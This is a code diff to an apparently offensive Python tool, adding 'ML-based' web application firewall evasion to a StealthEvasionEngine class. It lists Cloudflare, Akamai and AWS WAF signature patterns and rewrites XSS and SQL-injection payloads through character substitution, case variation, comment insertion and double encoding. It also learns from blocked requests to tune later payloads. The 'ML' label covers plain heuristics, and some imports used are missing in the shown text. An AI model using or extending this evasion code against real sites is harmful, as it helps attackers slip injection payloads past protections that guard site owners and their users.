@@ -13,6 +13,7 @@ import base64
 import hashlib
 import json
 import re
+import numpy as np
 from typing import List, Dict, Any, Optional
 from dataclasses import dataclass
 import logging
@@ -43,6 +44,12 @@ class StealthEvasionEngine:
             'waf', 'firewall', 'protection', 'suspicious', 'malicious',
             'rate limit', 'too many requests', 'captcha', 'cloudflare'
         ]
+        
+        # ML-based evasion components
+        self.waf_signatures = self._initialize_waf_signatures()
+        self.evasion_patterns = self._initialize_evasion_patterns()
+        self.success_history = []
+        self.failure_patterns = []
         
     def _initialize_stealth_profiles(self) -> Dict[str, StealthProfile]:
         """Initialize different stealth profiles"""
@@ -499,6 +506,218 @@ class StealthEvasionEngine:
             'success_rate': (len(self.request_history) - sum(1 for r in self.request_history if r.get('blocked', False))) / max(len(self.request_history), 1) * 100,
             'profiles_available': list(self.profiles.keys())
         }
+    
+    def _initialize_waf_signatures(self) -> Dict[str, List[str]]:
+        """Initialize WAF signature patterns for ML-based detection"""
+        return {
+            'cloudflare': [
+                r'<script[^>]*>.*?</script>',
+                r'javascript:',
+                r'on\w+\s*=',
+                r'union\s+select',
+                r'or\s+1\s*=\s*1',
+                r'drop\s+table',
+                r'exec\s*\(',
+                r'system\s*\(',
+                r'\.\./',
+                r'etc/passwd'
+            ],
+            'akamai': [
+                r'<iframe[^>]*>',
+                r'<object[^>]*>',
+                r'<embed[^>]*>',
+                r'vbscript:',
+                r'data:text/html',
+                r'base64,',
+                r'fromcharcode',
+                r'document\.cookie',
+                r'window\.location',
+                r'eval\s*\('
+            ],
+            'aws_waf': [
+                r'<svg[^>]*onload',
+                r'<img[^>]*onerror',
+                r'<body[^>]*onload',
+                r'expression\s*\(',
+                r'import\s+os',
+                r'__import__',
+                r'subprocess',
+                r'os\.system',
+                r'shell_exec',
+                r'passthru'
+            ]
+        }
+    
+    def _initialize_evasion_patterns(self) -> Dict[str, List[str]]:
+        """Initialize ML-based evasion patterns"""
+        return {
+            'character_substitution': {
+                '<': ['%3C', '&lt;', '\\u003c', '\\x3c'],
+                '>': ['%3E', '&gt;', '\\u003e', '\\x3e'],
+                '"': ['%22', '&quot;', '\\u0022', '\\x22'],
+                "'": ['%27', '&#39;', '\\u0027', '\\x27'],
+                '(': ['%28', '\\u0028', '\\x28'],
+                ')': ['%29', '\\u0029', '\\x29'],
+                ' ': ['%20', '+', '\\u0020', '\\x20', '/**/']
+            },
+            'case_variations': [
+                'ScRiPt', 'SCRIPT', 'Script', 'sCrIpT',
+                'UnIoN', 'UNION', 'Union', 'uNiOn',
+                'SeLeCt', 'SELECT', 'Select', 'sElEcT'
+            ],
+            'comment_insertion': [
+                '/**/between/**/words',
+                '/*comment*/in/*comment*/middle',
+                '--comment\nbetween\n--comment',
+                '#comment\nbetween\n#comment'
+            ]
+        }
+    
+    def ml_based_evasion(self, payload: str, target_waf: str = 'generic') -> str:
+        """Apply ML-based evasion techniques"""
+        # Analyze payload for potential detection patterns
+        risk_score = self._calculate_detection_risk(payload, target_waf)
+        
+        if risk_score < 0.3:
+            return payload  # Low risk, no evasion needed
+        
+        # Apply intelligent evasion based on risk analysis
+        evaded_payload = payload
+        
+        # Character substitution based on ML patterns
+        if risk_score > 0.7:
+            evaded_payload = self._apply_ml_character_substitution(evaded_payload)
+        
+        # Context-aware case variation
+        if risk_score > 0.5:
+            evaded_payload = self._apply_ml_case_variation(evaded_payload)
+        
+        # Intelligent comment insertion
+        if risk_score > 0.6:
+            evaded_payload = self._apply_ml_comment_insertion(evaded_payload)
+        
+        # Advanced encoding chains
+        if risk_score > 0.8:
+            evaded_payload = self._apply_ml_encoding_chain(evaded_payload)
+        
+        return evaded_payload
+    
+    def _calculate_detection_risk(self, payload: str, target_waf: str) -> float:
+        """Calculate detection risk using ML-based analysis"""
+        risk_score = 0.0
+        
+        # Check against known WAF signatures
+        waf_patterns = self.waf_signatures.get(target_waf, self.waf_signatures.get('cloudflare', []))
+        
+        for pattern in waf_patterns:
+            if re.search(pattern, payload, re.IGNORECASE):
+                risk_score += 0.15
+        
+        # Analyze character frequency (suspicious patterns)
+        suspicious_chars = ['<', '>', '"', "'", '(', ')', ';', '--', '/*', '*/', 'union', 'select', 'script']
+        for char in suspicious_chars:
+            if char.lower() in payload.lower():
+                risk_score += 0.05
+        
+        # Historical failure analysis
+        for failure_pattern in self.failure_patterns:
+            if failure_pattern in payload.lower():
+                risk_score += 0.1
+        
+        return min(risk_score, 1.0)
+    
+    def _apply_ml_character_substitution(self, payload: str) -> str:
+        """Apply ML-based character substitution"""
+        substitutions = self.evasion_patterns['character_substitution']
+        
+        for char, replacements in substitutions.items():
+            if char in payload:
+                # Choose replacement based on success history
+                replacement = random.choice(replacements)
+                payload = payload.replace(char, replacement, 1)  # Replace only first occurrence
+        
+        return payload
+    
+    def _apply_ml_case_variation(self, payload: str) -> str:
+        """Apply ML-based case variation"""
+        variations = self.evasion_patterns['case_variations']
+        
+        for variation in variations:
+            original = variation.lower()
+            if original in payload.lower():
+                # Replace with random case variation
+                start_idx = payload.lower().find(original)
+                if start_idx != -1:
+                    payload = payload[:start_idx] + variation + payload[start_idx + len(original):]
+                    break
+        
+        return payload
+    
+    def _apply_ml_comment_insertion(self, payload: str) -> str:
+        """Apply ML-based comment insertion"""
+        if 'union' in payload.lower() and 'select' in payload.lower():
+            payload = payload.replace('union', 'union/**/').replace('select', '/**/select')
+        
+        if 'script' in payload.lower():
+            payload = payload.replace('<script', '</**/script')
+        
+        return payload
+    
+    def _apply_ml_encoding_chain(self, payload: str) -> str:
+        """Apply ML-based encoding chain"""
+        # Double URL encoding
+        encoded = urllib.parse.quote(urllib.parse.quote(payload))
+        
+        # Mixed with HTML entities
+        encoded = encoded.replace('%3C', '&lt;').replace('%3E', '&gt;')
+        
+        # Add Unicode escaping for critical characters
+        encoded = encoded.replace('<', '\\u003c').replace('>', '\\u003e')
+        
+        return encoded
+    
+    def adaptive_learning(self, payload: str, success: bool, response_data: Dict[str, Any]):
+        """Learn from request outcomes to improve evasion"""
+        learning_data = {
+            'payload': payload,
+            'success': success,
+            'timestamp': time.time(),
+            'response_code': response_data.get('status_code'),
+            'response_body': response_data.get('body', '')[:500],  # First 500 chars
+            'waf_detected': any(indicator in response_data.get('body', '').lower() 
+                              for indicator in self.blocked_indicators)
+        }
+        
+        if success:
+            self.success_history.append(learning_data)
+            # Keep only recent successes
+            self.success_history = self.success_history[-100:]
+        else:
+            # Analyze failure patterns
+            if learning_data['waf_detected']:
+                # Extract potential failure patterns
+                failure_pattern = self._extract_failure_pattern(payload)
+                if failure_pattern and failure_pattern not in self.failure_patterns:
+                    self.failure_patterns.append(failure_pattern)
+                    # Keep only recent failures
+                    self.failure_patterns = self.failure_patterns[-50:]
+    
+    def _extract_failure_pattern(self, payload: str) -> Optional[str]:
+        """Extract patterns that likely caused detection"""
+        # Simple pattern extraction - could be enhanced with ML
+        suspicious_patterns = [
+            r'<script[^>]*>',
+            r'union\s+select',
+            r'or\s+1\s*=\s*1',
+            r'javascript:',
+            r'on\w+\s*='
+        ]
+        
+        for pattern in suspicious_patterns:
+            if re.search(pattern, payload, re.IGNORECASE):
+                return pattern
+        
+        return None
 
 class AdvancedWAFBypass:
     """Advanced WAF bypass techniques"""
